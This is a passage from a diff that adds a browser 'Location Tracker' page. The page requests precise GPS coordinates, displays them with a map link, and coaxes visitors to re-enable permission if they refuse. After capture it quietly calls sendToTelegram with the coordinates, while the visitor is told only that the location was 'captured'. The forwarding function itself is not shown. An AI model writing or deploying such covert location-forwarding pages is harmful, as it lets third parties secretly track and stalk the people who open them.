+        const accuracy = position.coords.accuracy;
+
+        // Show result
+        resultDiv.style.display = 'block';
+        resultDiv.className = '';
+        resultDiv.innerHTML = `
+          <div><span class="label">📍 Latitude:</span> ${lat}</div>
+          <div><span class="label">📍 Longitude:</span> ${lon}</div>
+          <div><span class="label">📏 Accuracy:</span> ${accuracy} meters</div>
+          <div style="margin-top:10px;">
+            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="map-link">
+              🗺️ Open in Google Maps
+            </a>
+          </div>
+        `;
+
+        showStatus('✅ Location captured successfully!', 'success');
+
+        // Send to Telegram
+        await sendToTelegram(lat, lon);
+
+        btn.disabled = false;
+        btn.textContent = '📍 Get My Location';
+      },
+      // ❌ Error
+      (error) => {
+        let msg = '❌ Unable to get location.';
+        if (error.code === 1) {
+          msg = '❌ Permission denied. Please allow location access in your browser settings.';
+          showStatus(msg, 'error');
+          // Show retry button
+          resultDiv.style.display = 'block';
+          resultDiv.className = 'error';
+          resultDiv.innerHTML = `
+            <span style="font-weight:600;">${msg}</span>
+            <br><br>
+            <button class="retry-btn" onclick="openSettings()">⚙️ Open Settings</button>
+            <button class="retry-btn" style="background:#0d6e4b; margin-left:8px;" onclick="getLocation()">🔄 Retry</button>
+          `;
+        } else if (error.code === 2) {
+          msg = '❌ Location unavailable. Please check your GPS.';
+          showStatus(msg, 'error');
+        } else if (error.code === 3) {
+          msg = '⏳ Location request timed out. Please try again.';
+          showStatus(msg, 'error');
+        }
+        btn.disabled = false;
+        btn.textContent = '📍 Get My Location';
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      }
+    );
+  }
+
+  // =============================================
+  // ⚙️ OPEN SETTINGS (Android Browser)
+  // =============================================
+  function openSettings() {
+    // For Android Chrome
+    if (navigator.userAgent.includes('Android')) {
+      window.location.href = 'app-settings:';
+    }
+    // Try to open browser settings
+    alert('Please enable Location permission in your browser settings:\n\n' +
+          'Chrome: Settings → Site Settings → Location → Allow\n' +
+          'Firefox: Settings → Privacy & Security → Location → Allow');
+  }
+
+  // =============================================
+  // 📌 SHOW STATUS
+  // =============================================
+  function showStatus(msg, type) {
+    statusDiv.style.display = 'block';
+    statusDiv.className = type;
+    statusDiv.textContent = msg;
+  }
+
+  // =============================================
+  // 🎯 BUTTON CLICK
+  // =============================================
+  btn.addEventListener('click', getLocation);
+
+  // =============================================
+  // 🚀 CHECK PERMISSION ON LOAD
+  // =============================================
+  checkPermissionStatus();
+
+  console.log('✅ Location Tracker Loaded');
+</script>
+
+</body>
+</html>
